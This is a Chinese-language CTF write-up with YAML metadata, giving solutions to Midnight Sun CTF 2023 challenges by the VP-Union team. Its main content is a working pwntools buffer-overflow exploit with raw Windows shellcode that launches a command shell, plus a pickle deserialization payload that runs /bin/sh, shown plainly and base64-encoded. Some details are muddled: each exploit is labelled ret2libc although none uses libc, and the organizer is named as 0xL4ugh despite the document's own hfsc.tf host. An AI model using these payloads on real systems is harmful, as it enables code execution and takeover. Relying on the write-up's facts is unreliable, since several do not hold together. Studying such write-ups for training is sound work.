---
title: Midnight Sun CTF 2023 Writeup by VP-Union (Polaris + ChaMd5 Venom 联合战队)
contest: Midnight Sun CTF
year: 2023
difficulty: medium
vuln_type: pwn_unknown
tags: [ret2libc, gets plt 写入 shellcode, pickle 任意执行, MIDNIGHT CTF 排名]
attack_chain: |
  1. pyttemjuk: gets_plt = 0x40263C, bss_addr = 0x405090
     - payload1 = 'a' * 0x14 + 4 + 0x8 + p32(gets_plt) + p32(0x401575) + p32(bss_addr)
     - 用 gets 把 shellcode 写到 bss
     - shellcode 是找 GetProcAddress + LoadLibraryA + CreateProcessA
     - 第二次 payload 跳到 bss
     - flag: midnight{i_prefer_sun_solaris_doors_over_microsoft_windows}
  2. MemeControl: torch 模块默认启用 pickle，pickle 任意执行漏洞
     - payload base64: cos\nsystem\n(S'/bin/sh'\ntR.
  3. SCAAS: 1 功能保存程序到本地 + 后续 ret2libc
key_payload: |
  # pyttemjuk ret2libc + gets 写 shellcode:
  gets_plt = 0x40263C
  bss_addr = 0x405090
  p1 = b'a' * (0x14 + 4 + 0x8) + p32(gets_plt) + p32(0x401575) + p32(bss_addr)
  r.sendlineafter('Enter your name: ', p1)
  # 第二次: send shellcode 到 bss
  p2 = b'\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9\x51\xff\xd6'
  r.sendline(p2)
  # 第三次: 跳到 bss
  p3 = b'a' * (0x14 + 4) + p32(bss_addr) + p32(bss_addr)
  r.sendlineafter('Enter your name: ', p3)
  
  # MemeControl pickle 任意执行:
  # payload:
  cos
  system
  (S'/bin/sh'
  tR.
one_liner: Midnight Sun CTF 2023 联合战队 (Polaris + ChaMd5 Venom = VP-Union) 排名第 23: pyttemjuk ret2libc + gets 写 shellcode + MemeControl pickle。
lesson: |
  - VP-Union 联合战队模式: 多支战队临时合并参赛
  - pyttemjuk 32 位 ret2libc + gets 写入 bss + 自构造 shellcode (GetProcAddress + LoadLibraryA + CreateProcessA)
  - torch 模块默认 pickle 反序列化漏洞: MemeControl 直接用 cos\nsystem\n(S'/bin/sh'\ntR. RCE
  - Midnight Sun CTF 是瑞典 0xL4ugh 团队的国际赛
quality: medium
---

# Midnight Sun CTF 2023 Writeup by VP-Union

> 来源: ctfiot.com 108846

## 排名

星盟安全团队的 Polaris 战队 + ChaMd5 的 Vemon 战队联合组成 **VP-Union 联合战队**，勇夺 **第 23 名**。

## pyttemjuk (32 位 Pwn)

```python
from pwn import *
from time import sleep

r = remote('pyttemjuk-1.play.hfsc.tf', 1337)
gets_plt = 0x40263C
bss_addr = 0x405090

# 第一次: gets 写到 bss
p1 = b'a' * (0x14 + 4 + 0x8) + p32(gets_plt) + p32(0x401575) + p32(bss_addr)
r.sendlineafter('Enter your name: ', p1)

# 第二次: send shellcode (找 GetProcAddress + LoadLibraryA + CreateProcessA)
p2 = b'\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9\x51\xff\xd6'
r.sendline(p2)

# 第三次: 跳到 bss
p3 = b'a' * (0x14 + 4) + p32(bss_addr) + p32(bss_addr)
r.sendlineafter('Enter your name: ', p3)

sleep(5)
r.sendline('dir')
r.interactive()
# midnight{i_prefer_sun_solaris_doors_over_microsoft_windows}
```

## MemeControl (torch pickle)

```python
# torch 模块默认启用 pickle, 而 pickle 有任意执行漏洞
payload = """cos
system
(S'/bin/sh'
tR.
"""
import base64
b64_payload = base64.b64encode(payload.encode()).decode()
# Y29zCnN5c3RlbQooUycvYmluL3NoJwp0Ui4=
```

## 评价

VP-Union 联合战队模式（多支战队临时合并）的成功经验，**国内常见于国际赛**，把多个战队的强项整合。

pyttemjuk 32 位 ret2libc + gets 写 bss + 自构造 shellcode (find GetProcAddress + LoadLibraryA + CreateProcessA chain) 是 32 位 pwn 入门模板。

MemeControl 用 torch 默认 pickle 反序列化漏洞是深度学习框架的常见误用。
